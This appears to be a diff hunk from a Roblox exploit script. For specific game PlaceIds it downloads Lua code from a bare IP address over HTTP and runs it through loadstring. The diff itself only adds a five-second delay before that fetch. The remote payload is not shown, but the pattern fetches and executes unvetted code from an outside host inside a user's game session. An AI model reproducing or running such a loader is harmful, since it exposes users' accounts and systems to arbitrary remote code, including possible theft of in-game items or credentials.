@@ -2,6 +2,7 @@
 repeat task.wait() until game:IsLoaded()
 wait(2);
 if game.PlaceId == 920587237 then
+task.wait(5);
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjI4MWI0Y2NhLWYwMGUtNGY5ZC05ODVjLTMyZGYyYTBiNzNiNSIsImtpbmQiOiJsb2FkZXIifQ"))()
 end
 if game.PlaceId == 142823291 then
